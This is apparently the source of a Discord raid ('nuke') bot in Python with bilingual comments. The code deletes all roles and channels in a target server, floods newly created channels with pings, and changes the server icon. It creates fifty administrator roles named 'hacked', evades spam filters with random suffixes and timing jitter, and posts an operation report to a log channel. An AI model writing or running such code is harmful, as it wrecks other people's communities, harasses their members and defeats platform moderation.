import discord
import asyncio
import aiohttp
import random
import string
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ ANTI-BOT SECURITY MODULE / MODULO DE SEGURIDAD ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_random_string(length=6):
    """Generates a random string to bypass simple message filters."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_obfuscated_text(base_text):
    """Adds invisible characters or random suffixes to bypass bot detection."""
    # Add a random invisible suffix or random string
    return f"{base_text} | [{get_random_string()}]"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ EXECUTION ENGINE / MOTOR DE EJECUCION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def execute_nuke(ctx, bot, channel_name, spam_text, num_channels, total_pings, is_premium, log_id, icon_url):
    guild = ctx.guild
    original_member_count = guild.member_count
    raid_type = "PREMIUM" if is_premium else "STANDARD / ESTANDAR"
    
    print(f"INITIATING RAID {raid_type} IN: {guild.name}")
    
    # 1. Fast & Stealthy Destruction
    destruction_tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild, icon_url))
        
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    
    # 2. Optimized & Anti-Bot Spam
    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
    
    for i in range(num_channels):
        extra_ping = 1 if i < remaining_pings else 0
        # Use create_task for non-blocking channel creation
        asyncio.create_task(create_and_spam(guild, channel_name, spam_text, i, pings_per_channel + extra_ping, is_premium))
        # Small jitter between channel creations to avoid pattern detection
        await asyncio.sleep(random.uniform(0.05, 0.15))
    
    print(f"RAID COMPLETED IN: {guild.name}")
    await send_log_embed(ctx, bot, raid_type, original_member_count, num_channels, total_pings, log_id)

async def create_and_spam(guild, channel_name, spam_text, index, num_pings, is_premium):
    try:
        # Randomize channel name slightly if premium
        final_name = f"{channel_name}-{index+1}"
        if is_premium:
            final_name = f"{channel_name}-{get_random_string(4)}"
            
        channel = await guild.create_text_channel(final_name)
        asyncio.create_task(spam_pings(channel, spam_text, num_pings, is_premium))
    except Exception: pass

async def spam_pings(channel, spam_text, amount, is_premium):
    sent_count = 0
    while sent_count < amount:
        try:
            # Anti-Bot: Obfuscate text if premium
            final_text = get_obfuscated_text(spam_text) if is_premium else spam_text
            
            await channel.send(final_text)
            sent_count += 1
            
            # Anti-Bot: Random jitter between messages (0.05s to 0.1s)
            # This makes the bot look more "human-like" to automated filters
            await asyncio.sleep(random.uniform(0.01, 0.05))
            
        except discord.HTTPException as e:
            if e.status == 429: # Rate limit
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.5
                await asyncio.sleep(retry_after + 0.1)
            else:
                break
        except Exception:
            break

async def execute_premium_actions(guild, icon_url):
    tasks = [change_server_icon(guild, icon_url), create_chaotic_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def change_server_icon(guild, icon_url):
    try:
        async with aiohttp.ClientSession() as session, session.get(icon_url) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except Exception: pass

async def create_chaotic_roles(guild):
    tasks = []
    for i in range(50):
        role_name = f"hacked-{get_random_string(5)}"
        tasks.append(guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True)))
    await asyncio.gather(*tasks, return_exceptions=True)

async def send_log_embed(ctx, bot, raid_type, member_count, channels, total_pings, log_id):
    log_channel = bot.get_channel(log_id)
    if not log_channel: return
    
    embed = discord.Embed(
        title="OPERATION REPORT / REPORTE DE OPERACION",
        color=0x2b2d31,
        timestamp=datetime.utcnow()
    )
    embed.add_field(name="Server / Servidor", value=f"**{ctx.guild.name}**\n`({ctx.guild.id})`", inline=True)
    embed.add_field(name="Author / Autor", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Type / Tipo", value=f"`{raid_type}`", inline=True)
    
    stats = f"```\nMembers / Miembros: {member_count}\nChannels / Canales: {channels}\nPings / Pings:     {total_pings}\n```"
    embed.add_field(name="Statistics / Estadisticas", value=stats, inline=False)
    
    if ctx.guild.icon: embed.set_thumbnail(url=ctx.guild.icon.url)
    embed.set_footer(text="Operation Finished / Operacion Finalizada")
    
    try: await log_channel.send(embed=embed)
    except: pass
          
